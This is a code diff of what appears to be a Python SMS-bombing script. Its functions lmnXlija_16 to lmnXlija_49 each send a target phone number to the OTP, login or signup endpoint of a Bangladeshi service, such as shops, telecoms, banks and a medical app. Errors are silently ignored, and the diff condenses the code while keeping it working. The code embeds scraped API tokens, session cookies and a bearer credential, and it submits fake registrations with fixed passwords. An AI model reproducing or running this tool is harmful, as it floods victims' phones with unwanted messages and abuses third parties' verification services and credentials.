-            'user-agent': lmnXuserAgent1,
-        }
-        params = {
-            'phone': number,
-        }
-        response = requests.get('https://bikroy.com/data/phone_number_login/verifications/phone_login', params=params, headers=headers)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
-        
-def lmnXlija_16(number):#----------{"100% OK": "RUBISH"}----------#
+        requests.get('https://bikroy.com/data/phone_number_login/verifications/phone_login', params={'phone': number}, headers={'User-Agent': lmnXuserAgent1})
+    except: pass
+
+def lmnXlija_16(number):
     try:
-        headers = {
-            'accept': 'application/json, text/plain, */*',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'no-cache',
-            'content-type': 'application/json',
-            'origin': 'https://motionview.com.bd',
-            'pragma': 'no-cache',
-            'priority': 'u=1, i',
-            'referer': 'https://motionview.com.bd/',
-            'sec-ch-ua': lmnXaccessVersion2,
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-site',
-            'user-agent': lmnXuserAgent1,
-        }
-        json_data = {
-            'phone': number,
-        }
-        response = requests.post('https://api.motionview.com.bd/api/send-otp-phone-signup', headers=headers, json=json_data)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
-        
-def lmnXlija_17(number):#----------{"100% OK": "RUBISH"}----------#
+        requests.post('https://api.motionview.com.bd/api/send-otp-phone-signup', headers={'Content-Type': 'application/json', 'User-Agent': lmnXuserAgent1}, json={'phone': number})
+    except: pass
+
+def lmnXlija_17(number):
     try:
-        headers = {
-            'accept': 'application/json',
-            'accept-language': 'en-US,en;q=0.9',
-            'authorization': '',
-            'cache-control': 'no-cache',
-            'content-type': 'application/json',
-            'origin': 'https://www.chorki.com',
-            'pragma': 'no-cache',
-            'priority': 'u=1, i',
-            'referer': 'https://www.chorki.com/',
-            'sec-ch-ua': lmnXaccessVersion2,
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-site',
-            'user-agent': lmnXuserAgent1,
-        }
-        params = {
-            'country': 'BD',
-            'platform': 'web',
-            'language': 'en',
-        }
-        json_data = {
-            'number': '+88'+number,
-        }
-        response = requests.post('https://api-dynamic.chorki.com/v2/auth/login', params=params, headers=headers, json=json_data)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
-        
-def lmnXlija_18(number):#----------{"100% OK": "RUBISH"}----------#
+        requests.post('https://api-dynamic.chorki.com/v2/auth/login', params={'country': 'BD', 'platform': 'web', 'language': 'en'}, headers={'Content-Type': 'application/json', 'User-Agent': lmnXuserAgent1}, json={'number': '+88'+number})
+    except: pass
+
+def lmnXlija_18(number):
     try:
-        headers = {
-            'accept': 'application/json, text/plain, */*',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'no-cache',
-            'content-type': 'application/json',
-            'origin': 'https://rental.jatri.co',
-            'pragma': 'no-cache',
-            'priority': 'u=1, i',
-            'referer': 'https://rental.jatri.co/',
-            'sec-ch-ua': lmnXaccessVersion2,
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'cross-site',
-            'user-agent': lmnXuserAgent1,
-        }
-        json_data = {
-            'phone': '+88'+number,
-            'jatri_token': 'J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj',
-        }
-        response = requests.post('https://user-api.jslglobal.co:444/v2/send-otp', headers=headers, json=json_data)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
-        
-def lmnXlija_19(number):#----------{"100% OK": "RUBISH"}----------#
+        requests.post('https://user-api.jslglobal.co:444/v2/send-otp', headers={'Content-Type': 'application/json', 'User-Agent': lmnXuserAgent1}, json={'phone': '+88'+number, 'jatri_token': 'J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj'})
+    except: pass
+
+def lmnXlija_19(number):
     try:
-        headers = {
-            'accept': 'application/json, text/plain, */*',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'no-cache',
-            'pragma': 'no-cache',
-            'priority': 'u=1, i',
-            'referer': 'https://chinaonlinebd.com/login?next=/dashboard',
-            'sec-ch-ua': lmnXaccessVersion2,
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-origin',
-            'token': '45601f3d391886fcec5f5a3f26780f21',
-            'user-agent': lmnXuserAgent1,
-        }
-        params = {
-            'phone': number,
-        }
-        response = requests.get('https://chinaonlinebd.com/api/login/getOtp', params=params, headers=headers)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
-        
-def lmnXlija_20(number):#----------{"100% OK": "RUBISH"}----------#
+        requests.get('https://chinaonlinebd.com/api/login/getOtp', params={'phone': number}, headers={'User-Agent': lmnXuserAgent1, 'token': '45601f3d391886fcec5f5a3f26780f21'})
+    except: pass
+
+def lmnXlija_20(number):
     try:
-        headers = {
-            'accept': 'application/json',
-            'accept-language': 'en-US,en;q=0.9',
-            'authorization': '',
-            'cache-control': 'no-cache',
-            'content-type': 'application/json',
-            'origin': 'https://www.deeptoplay.com',
-            'pragma': 'no-cache',
-            'priority': 'u=1, i',
-            'referer': 'https://www.deeptoplay.com/',
-            'sec-ch-ua': lmnXaccessVersion2,
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-site',
-            'user-agent': lmnXuserAgent1,
-        }
-        params = {
-            'country': 'BD',
-            'platform': 'web',
-            'language': 'en',
-        }
-        json_data = {
-            'number': '+88'+number,
-        }
-        response = requests.post('https://api.deeptoplay.com/v2/auth/login', params=params, headers=headers, json=json_data).json()
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
-        
-def lmnXlija_21(number):#----------{"100% OK": "RUBISH"}----------#
+        requests.post('https://api.deeptoplay.com/v2/auth/login', params={'country': 'BD', 'platform': 'web', 'language': 'en'}, headers={'Content-Type': 'application/json', 'User-Agent': lmnXuserAgent1}, json={'number': '+88'+number})
+    except: pass
+
+def lmnXlija_21(number):
     try:
-        headers = {
-            'accept': 'application/json, text/plain, */*',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'no-cache',
-            'content-type': 'application/json',
-            'origin': 'https://shikho.com',
-            'pragma': 'no-cache',
-            'priority': 'u=1, i',
-            'referer': 'https://shikho.com/',
-            'sec-ch-ua': lmnXaccessVersion2,
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-site',
-            'user-agent': lmnXuserAgent1,
-        }
-        json_data = {
-            'phone': number,
-            'type': 'student',
-            'auth_type': 'signup',
-            'vendor': 'shikho',
-        }
-        response = requests.post('https://api.shikho.com/auth/v2/send/sms', headers=headers, json=json_data).json()
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
-        
-def lmnXlija_22(number):#----------{"100% OK": "RUBISH"}----------#
+        requests.post('https://api.shikho.com/auth/v2/send/sms', headers={'Content-Type': 'application/json', 'User-Agent': lmnXuserAgent1}, json={'phone': number, 'type': 'student', 'auth_type': 'signup', 'vendor': 'shikho'})
+    except: pass
+
+def lmnXlija_22(number):
     try:
-        url5 = "https://api.redx.com.bd/v1/user/signup"
         headers5 = CaseInsensitiveDict()
-        headers5["Accept"] = "application/json, text/plain, */*"
-        headers5["Accept-Encoding"] = "gzip, deflate, br"
-        headers5["Accept-Language"] = "en-US,en;q=0.5"
-        headers5["Connection"] = "keep-alive"
-        headers5["Content-Length"] = "65"
         headers5["Content-Type"] = "application/json"
-        headers5["Cookie"] = "_ga=GA1.3.1117093475.951445077; _gid=GA1.3.134905361.951445077; WZRK_S_4R6-9R6-155Z=%7B%22p%22%3A1%2C%22s%22%3A951410497%2C%22t%22%3A951445096%7D; WZRK_G=6184e322525e444ab0f771f7f041933a; _fbp=fb.2.951445106167.1213159921; _hjSessionUser_2064965=eyJpZCI6ImRhMmMzMDY1LWNkMDYtNWFlOC04NTA4LTg0MzYzYWM4Y2RiNyIsImNyZWF0ZWQiOjE2NTE0NDUxMDkwMjMsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjSession_2064965=eyJpZCI6IjMxMGI0MDQ2LTY3OGUtNDM2OS1hOWY1LTRlYzlmOWEyMDhkNCIsImNyZWF0ZWQiOjE2NTE0NDUxMTg1NzgsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=1"
-        headers5["Host"] = "api.redx.com.bd"
-        headers5["Origin"] = "https://redx.com.bd"
-        headers5["Referer"] = "https://redx.com.bd/registration/"
-        headers5["TE"] = "Trailers"
         headers5["User-Agent"] = lmnXuserAgent3
-        headers5["x-access-token"] = "Bearer null"
         data5 = '{"name":"961096106","phoneNumber":"'+number+'","service":"redx"}'
-        res = requests.post(url5, headers=headers5, data=data5)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
-    
-def lmnXlija_23(number):#----------{"100% OK": "RUBISH"}----------#
+        requests.post("https://api.redx.com.bd/v1/user/signup", headers=headers5, data=data5)
+    except: pass
+
+def lmnXlija_23(number):
+    try: requests.get("https://bikroy.com/data/phone_number_login/verifications/phone_login?phone="+number)
+    except: pass
+
+def lmnXlija_24(number):
+    try: requests.post('https://www.bioscopelive.com/en/login/send-otp?phone=88'+number+'&operator=bd-otp')
+    except: pass
+
+def lmnXlija_25(number):
+    try: requests.post('https://ss.binge.buzz/otp/send/login'+number)
+    except: pass
+
+def lmnXlija_26(number):
     try:
-        payload = {"mobile":""+number}
-        res = requests.get("https://bikroy.com/data/phone_number_login/verifications/phone_login?phone="+number)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
-    
-def lmnXlija_24(number):#----------{"100% OK": "RUBISH"}----------#
-    try:response = requests.post('https://www.bioscopelive.com/en/login/send-otp?phone=88'+number+'&operator=bd-otp')
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
-    
-def lmnXlija_25(number):#----------{"100% OK": "RUBISH"}----------#
-    try:response = requests.post('https://ss.binge.buzz/otp/send/login'+number)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
-        
-def lmnXlija_26(number):#----------{"100% OK": "RUBISH"}----------#
-    try:
-        url3 = "https://fundesh.com.bd/api/auth/generateOTP?service_key="
         headers3 = CaseInsensitiveDict()
         headers3["Content-Type"] = "application/json"
-        data3 = '{"msisdn":"'+number+'"}'
-        res = requests.post(url3, headers=headers3, data=data3)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
+        requests.post("https://fundesh.com.bd/api/auth/generateOTP?service_key=", headers=headers3, data='{"msisdn":"'+number+'"}')
+    except: pass
 
-def lmnXlija_27(number):#----------{"100% OK": "RUBISH"}----------#
+def lmnXlija_27(number):
     try:
-        url = "https://applink.com.bd/appstore-v4-server/login/otp/request"
-        headers = {
-            "User-Agent": lmnXuserAgent4,
-            "Referer": "https://applink.com.bd/",
-            "Content-Type": "application/json",
-            "Origin": "https://applink.com.bd",
-        }
-        data = {
-            "msisdn": "88"+number
-        }
-        response = requests.post(url, headers=headers, data=json.dumps(data), verify=False)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
+        requests.post("https://applink.com.bd/appstore-v4-server/login/otp/request", headers={"Content-Type": "application/json", "User-Agent": lmnXuserAgent4}, data=json.dumps({"msisdn": "88"+number}), verify=False)
+    except: pass
 
-def lmnXlija_28(number):#----------{"100% OK": "RUBISH"}----------#
+def lmnXlija_28(number):
     try:
-        url = "https://chokrojan.com/api/v1/passenger/login/mobile"
-        headers = {
-            "User-Agent": lmnXuserAgent4,
-            "domain-name": "chokrojan.com",
-            "user-platform": "3",
-            "company-id": "1",
-            "Origin": "https://chokrojan.com",
-            "Referer": "https://chokrojan.com/login",
-            "Cookie": "_ga_TXX7J24H07=GS1.1.1681140800.3.1.1681142406.0.0.0; _ga=GA1.1.162112941.1678173405; _fbp=fb.1.1678173407195.536316567",
-            "Content-Type": "application/json",
-        }
-        data = json.dumps({"mobile_number": number})
-        response = requests.post(url, headers=headers, data=data, verify=False)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
+        requests.post("https://chokrojan.com/api/v1/passenger/login/mobile", headers={"Content-Type": "application/json", "User-Agent": lmnXuserAgent4}, data=json.dumps({"mobile_number": number}), verify=False)
+    except: pass
 
-def lmnXlija_29(number):#----------{"100% OK": "RUBISH"}----------#
+def lmnXlija_29(number):
     try:
-        url = "https://chokrojan.com/api/v1/passenger/login/mobile"
-        headers = {
-            "User-Agent": lmnXuserAgent4,
-            "domain-name": "chokrojan.com",
-            "user-platform": "3",
-            "company-id": "1",
-            "Origin": "https://chokrojan.com",
-            "Referer": "https://chokrojan.com/login",
-            "Cookie": "_ga_TXX7J24H07=GS1.1.1681140800.3.1.1681142406.0.0.0; _ga=GA1.1.162112941.1678173405; _fbp=fb.1.1678173407195.536316567",
-            "Content-Type": "application/json",
-        }
-        data = {
-            "mobile_number": number
-        }
-        response = requests.post(url, headers=headers, data=json.dumps(data))
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
+        requests.post("https://chokrojan.com/api/v1/passenger/login/mobile", headers={"Content-Type": "application/json", "User-Agent": lmnXuserAgent4}, data=json.dumps({"mobile_number": number}))
+    except: pass
 
-def lmnXlija_30(number):#----------{"100% OK": "RUBISH"}----------#
+def lmnXlija_30(number):
     try:
-        url = "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber"
-        headers = {
-            "Content-Type": "application/json",
-            "User-Agent": lmnXuserAgent4
-        }
-        data = {
-            "AccessToken": "",
-            "TrackingNo": "",
-            "mobileNo": number,
-            "otpSms": "",
-            "product_id": "250",
-            "requestChannel": "MOB",
-            "trackingStatus": 5
-        }
-        response = requests.post(url, headers=headers, data=json.dumps(data), verify=False)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
+        requests.post("https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber", headers={"Content-Type": "application/json", "User-Agent": lmnXuserAgent4}, data=json.dumps({"AccessToken": "", "TrackingNo": "", "mobileNo": number, "otpSms": "", "product_id": "250", "requestChannel": "MOB", "trackingStatus": 5}), verify=False)
+    except: pass
 
-def lmnXlija_31(number):#----------{"100% OK": "RUBISH"}----------#
+def lmnXlija_31(number):
     try:
-        url = 'https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber'
-        data = {
-            'data': {
-                'flag': 'https://doctime-core-ap-southeast-1.s3.ap-southeast-1.amazonaws.com/images/country-flags/flag-800.png',
-                'code': '88',
-                'contact_no': number,
-                'country_calling_code': '88',
-                'headers': {
-                    'PlatForm': 'Web'
-                }
-            }
-        }
-        headers = {
-            'Content-type': 'application/json',
-            'Referer': 'https://doctime.com.bd/',
-            'Origin': 'https://doctime.com.bd',
-            'User-Agent': lmnXuserAgent4,
-        }
-        response = requests.post(url, headers=headers, data=json.dumps(data), verify=False)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
+        requests.post('https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber', headers={'Content-type': 'application/json', 'User-Agent': lmnXuserAgent4}, data=json.dumps({'data': {'code': '88', 'contact_no': number, 'country_calling_code': '88', 'headers': {'PlatForm': 'Web'}}}), verify=False)
+    except: pass
 
-def lmnXlija_32(number):#----------{"100% OK": "RUBISH"}----------#
+def lmnXlija_32(number):
     try:
-        url = "https://core.easy.com.bd/api/v1/registration"
-        headers = {
-            "User-Agent": lmnXuserAgent4,
-            "Referer": "https://easy.com.bd/",
-            "Content-Type": "application/json",
-        }
-        data = {
-            "name": "Rubish Khan",
-            "email": "uyrlhkgxqw@emergentvillage.org",
-            "mobile": number,
-            "password": "boss#2022",
-            "password_confirmation": "boss#2022",
-            "device_key": "9a28ae67c5704e1fcb50a8fc4ghjea4d"
-        }
-        response = requests.post(url, headers=headers, data=json.dumps(data), verify=False)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
+        requests.post("https://core.easy.com.bd/api/v1/registration", headers={"Content-Type": "application/json", "User-Agent": lmnXuserAgent4}, data=json.dumps({"name": "Rubish Khan", "email": "uyrlhkgxqw@emergentvillage.org", "mobile": number, "password": "boss#2022", "password_confirmation": "boss#2022", "device_key": "9a28ae67c5704e1fcb50a8fc4ghjea4d"}), verify=False)
+    except: pass
 
-def lmnXlija_33(number):#----------{"100% OK": "RUBISH"}----------#
+def lmnXlija_33(number):
     try:
-        url = "https://eshop-api.banglalink.net/api/v1/customer/send-otp"
-        headers = {
-            "User-Agent": lmnXuserAgent4,
-            "Content-Type": "application/json",
-        }
-        data = {
-            "type": "phone",
-            "phone": number,
-        }
-        response = requests.post(url, headers=headers, data=json.dumps(data), verify=False)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
+        requests.post("https://eshop-api.banglalink.net/api/v1/customer/send-otp", headers={"Content-Type": "application/json", "User-Agent": lmnXuserAgent4}, data=json.dumps({"type": "phone", "phone": number}), verify=False)
+    except: pass
 
-def lmnXlija_34(number):#----------{"100% OK": "RUBISH"}----------#
+def lmnXlija_34(number):
     try:
-        api_url = 'https://freedom.fsiblbd.com/verifidext/api/CustOnBoarding/VerifyMobileNumber'
-        access_token = ''
-        tracking_no = ''
-        otp_sms = ''
-        product_id = '122'
-        request_channel = 'MOB'
-        tracking_status = 5
-        data = {
-            'AccessToken': access_token,
-            'TrackingNo': tracking_no,
-            'mobileNo': number,
-            'otpSms': otp_sms,
-            'product_id': product_id,
-            'requestChannel': request_channel,
-            'trackingStatus': tracking_status,
-        }
-        headers = {
-            'Content-Type': 'application/json',
-            'User-Agent': lmnXuserAgent4,
-        }
-        response = requests.post(api_url, json=data, headers=headers)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
+        requests.post('https://freedom.fsiblbd.com/verifidext/api/CustOnBoarding/VerifyMobileNumber', json={'AccessToken': '', 'TrackingNo': '', 'mobileNo': number, 'otpSms': '', 'product_id': '122', 'requestChannel': 'MOB', 'trackingStatus': 5}, headers={'Content-Type': 'application/json', 'User-Agent': lmnXuserAgent4})
+    except: pass
 
-def lmnXlija_35(number):#----------{"100% OK": "RUBISH"}----------#
+def lmnXlija_35(number):
     try:
-        url = f"https://api.mygp.cinematic.mobi/api/v1/otp/88{number}/SBENT_3GB7D"
-        headers = {
-            "User-Agent": lmnXuserAgent4,
-            "Content-Type": "application/json",
-        }
-        data = {
-            "accessinfo": {
-                "access_token": "K165S6V6q4C6G7H0y9C4f5W7t5YeC6",
-                "referenceCode": "20190827042622"
-            }
-        }
-        response = requests.post(url, json=data, headers=headers)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
+        requests.post(f"https://api.mygp.cinematic.mobi/api/v1/otp/88{number}/SBENT_3GB7D", json={"accessinfo": {"access_token": "K165S6V6q4C6G7H0y9C4f5W7t5YeC6", "referenceCode": "20190827042622"}}, headers={"User-Agent": lmnXuserAgent4, "Content-Type": "application/json"})
+    except: pass
 
-def lmnXlija_36(number):#----------{"100% OK": "RUBISH"}----------#
+def lmnXlija_36(number):
     try:
-        url = "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp"
-        data = {
-            "phone": number,
-            "email": "",
-            "language": "en"
-        }
-        headers = {
-            "Content-Type": "application/json",
-            "User-Agent": lmnXuserAgent5
-        }
-        response = requests.post(url, json=data, headers=headers)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
+        requests.post("https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp", json={"phone": number, "email": "", "language": "en"}, headers={"Content-Type": "application/json", "User-Agent": lmnXuserAgent5})
+    except: pass
 
-def lmnXlija_37(number):#----------{"100% OK": "RUBISH"}----------#
+def lmnXlija_37(number):
     try:
-        url = f"https://app.hishabee.business/api/V2/otp/send?mobile_number={number}"
-        headers = {
-            "User-Agent": lmnXuserAgent4,
-            "Content-Type": "application/json",
-            "Content-Length": "0"
-        }
-        response = requests.post(url, headers=headers)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
+        requests.post(f"https://app.hishabee.business/api/V2/otp/send?mobile_number={number}", headers={"User-Agent": lmnXuserAgent4, "Content-Type": "application/json"})
+    except: pass
 
-def lmnXlija_38(number):#----------{"100% OK": "RUBISH"}----------#
+def lmnXlija_38(number):
+    try: requests.get(f"http://apibeta.iqra-live.com/api/v1/sent-otp/{number}", verify=False)
+    except: pass
+
+def lmnXlija_39(number):
     try:
-        url = f"http://apibeta.iqra-live.com/api/v1/sent-otp/{number}"
-        response = requests.get(url, verify=False)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
+        requests.post("https://smart1216.robi.com.bd/robi_sivr/public/login/phone", headers={"Content-Type": "application/json", "User-Agent": lmnXuserAgent4}, json={"cli": number.lstrip('0')}, verify=False)
+    except: pass
 
-def lmnXlija_39(number):#----------{"100% OK": "RUBISH"}----------#
+def lmnXlija_40(number):
     try:
-        url = "https://smart1216.robi.com.bd/robi_sivr/public/login/phone"
-        number = number.lstrip('0')
-        headers = {
-            "Content-Type": "application/json",
-            "User-Agent": lmnXuserAgent4,
-        }
-        data = {
-            "cli": ""+number
-        }
-        response = requests.post(url, headers=headers, json=data, verify=False)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
+        requests.post("https://user-api.jslglobal.co:444/v1/send-otp", headers={"User-Agent": lmnXuserAgent6}, data={"phone": "+88"+number, "jatri_token": "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"}, verify=False)
+    except: pass
 
-def lmnXlija_40(number):#----------{"100% OK": "RUBISH"}----------#
+def lmnXlija_41(number):
     try:
-        url = "https://user-api.jslglobal.co:444/v1/send-otp"
-        headers = {
-            "User-Agent": lmnXuserAgent6,
-            "Origin": "https://rental.jatri.co",
-            "Referer": "https://rental.jatri.co/",
-        }
-        data = {
-            "phone": "+88"+number,
-            "jatri_token": "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"
-        }
-        response = requests.post(url, headers=headers, data=data, verify=False)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
+        requests.post("https://www.mcbaffiliate.com/Affiliate/RequestOTP", headers={"User-Agent": lmnXuserAgent7, "Content-Type": "application/x-www-form-urlencoded"}, data={"PhoneNumber": number}, verify=False)
+    except: pass
 
-def lmnXlija_41(number):#----------{"100% OK": "RUBISH"}----------#
+def lmnXlija_42(number):
     try:
-        url = "https://www.mcbaffiliate.com/Affiliate/RequestOTP"
-        headers = {
-            "User-Agent": lmnXuserAgent7,
-            "Content-Type": "application/x-www-form-urlencoded",
-        }
-        data = {"PhoneNumber": number}
-        response = requests.post(url, headers=headers, data=data, verify=False)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
+        requests.post("https://mithaibd.com/api/login/?lang_code=en¤cy_code=BDT", headers={"Authorization": "Bearer bWlzNTdAcHJhbmdyb3VwLmNvbTpJWE94N1NVUFYwYUE0Rjg4Nmg4bno5V2I2STUzNTNBQQ==", "Content-Type": "application/json"}, data=json.dumps({"company_id": "2", "password2": "Rahu333@@", "currency_code": "BDT", "user_type": "C", "email": "fuckyoubro"+number+"@gmail.com", "lang_code": "en", "operating_system": "Android", "otp_verify": False, "password1": "Rahu333@@", "phone": number, "storefront_id": "5"}), verify=False)
+    except: pass
 
-def lmnXlija_42(number):#----------{"100% OK": "RUBISH"}----------#
+def lmnXlija_43(number):
     try:
-        url = "https://mithaibd.com/api/login/?lang_code=en¤cy_code=BDT"
-        headers = {
-            "user-agent": "okhttp/4.2.2",
-            "Authorization": "Bearer bWlzNTdAcHJhbmdyb3VwLmNvbTpJWE94N1NVUFYwYUE0Rjg4Nmg4bno5V2I2STUzNTNBQQ==",
-            "Content-Type": "application/json",
-        }
-        data = json.dumps({
-            "company_id": "2",
-            "password2": "Rahu333@@",
-            "currency_code": "BDT",
-            "user_type": "C",
-            "email": "fuckyoubro"+number+"@gmail.com",
-            "g_id": "",
-            "lang_code": "en",
-            "operating_system": "Android",
-            "otp_verify": False,
-            "password1": "Rahu333@@",
-            "phone": number,
-            "storefront_id": "5"
-        })
-        response = requests.post(url, headers=headers, data=data, verify=False)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
+        requests.post("https://api.englishmojabd.com/api/v1/auth/login", data=json.dumps({"phone": "+88"+number}), headers={"Content-Type": "application/json"})
+    except: pass
 
-def lmnXlija_43(number):#----------{"100% OK": "RUBISH"}----------#
+def lmnXlija_44(number):
     try:
-        url = "https://api.englishmojabd.com/api/v1/auth/login"
-        data = {
-            "phone": "+88"+number
-        }
-        headers = {
-            "Content-Type": "application/json"
-        }
-        response = requests.post(url, headers=headers, data=json.dumps(data))
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
+        requests.post("https://moveon.com.bd/api/v1/customer/auth/phone/request-otp", headers={"Content-Type": "application/json", "User-Agent": lmnXuserAgent4}, data=json.dumps({"phone": number}), verify=False)
+    except: pass
 
-def lmnXlija_44(number):#----------{"100% OK": "RUBISH"}----------#
+def lmnXlija_45(number):
     try:
-        url = "https://moveon.com.bd/api/v1/customer/auth/phone/request-otp"
-        headers = {
-            "User-Agent": lmnXuserAgent4,
-            "Origin": "https://moveon.com.bd",
-            "Alt-Used": "moveon.com.bd",
-            "Referer": "https://moveon.com.bd/auth/register",
-            "Cookie": "_ga_859WPGTZ3G=GS1.1.1676461030.2.1.1676462180.60.0.0; _ga=GA1.1.721458614.1675951340; cw_conversation=eyJhbGciOiJIUzI1NiJ9.eyJzb3VyY2VfaWQiOiJmZWFjNGU1ZS05ZWFjLTRiNmUtOGE0NS0wYTZmZGIzYTEwM2IiLCJpbmJveF9pZCI6M30.LHi3LXYC1jwkCEToPcecMmbGAuswXhjwM0ezittu0I4; G_ENABLED_IDPS=google; _hjSessionUser_2677527=eyJpZCI6IjRhZWZjZDA3LTUzOWMtNTY3Yy05OWM3LWIyYmUwNDE0OTM4ZSIsImNyZWF0ZWQiOjE2NzY0NjEwNDIxMjMsImV4aXN0aW5nIjp0cnVlfQ==",
-            "Content-Type": "application/json",
-        }
-        data = json.dumps({"phone": number})
-        response = requests.post(url, headers=headers, data=data, verify=False)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
+        requests.post("https://api.osudpotro.com/api/v1/users/send_otp", headers={"Content-Type": "application/json", "User-Agent": lmnXuserAgent4}, data=json.dumps({"mobile": "+88-"+number, "deviceToken": "app", "language": "bn", "os": "android"}), verify=False)
+    except: pass
 
-def lmnXlija_45(number):#----------{"100% OK": "RUBISH"}----------#
+def lmnXlija_46(number):
+    try: requests.get(f"https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88{number}&lang=en&ng=0", headers={"user-agent": lmnXuserAgent8}, verify=False)
+    except: pass
+
+def lmnXlija_47(number):
     try:
-        url = "https://api.osudpotro.com/api/v1/users/send_otp"
-        headers = {
-            "Content-Type": "application/json",
-            "User-Agent": lmnXuserAgent4,
-        }
-        data = json.dumps({
-            "mobile": "+88-"+number,
-            "deviceToken": "app",
-            "language": "bn",
-            "os": "android"
-        })
-        response = requests.post(url, headers=headers, data=data, verify=False)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
+        requests.post("https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", headers={"Content-Type": "application/json", "User-Agent": lmnXuserAgent4}, data=json.dumps({"full_name": "Rubish Khan", "company_name": "Rubish", "email_address": "rubish@gmail.com", "phone_number": number}), verify=False)
+    except: pass
 
-def lmnXlija_46(number):#----------{"100% OK": "RUBISH"}----------#
+def lmnXlija_48(number):
     try:
-        url = f"https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88{number}&lang=en&ng=0"
-        headers = {
-            "user-agent": lmnXuserAgent8,
-        }
-        response = requests.get(url, headers=headers, verify=False)
-    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
+        requests.post("https://auth.qcoom.com/api/v1/otp/send", json={"mobileNumber": "+88"+number}, headers={"Content-Type": "application/json", "User-Agent": lmnXuserAgent4}, verify=False)
+    except: pass
 
-def lmnXlija_47(number):#----------{"100% OK": "RUBISH"}----------#
+def lmnXlija_49(number):
     try:
-        url = "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php"
-        headers = {
-            "Content-Type": "application/json",
-            "User-Agent": lmnXuserAgent4,
-        }
-        data = json.dumps({
-            "full_name": "Rubish Khan",
-            "company_name": "Rubish",
-            "email_address": "rubish@gmail.com",
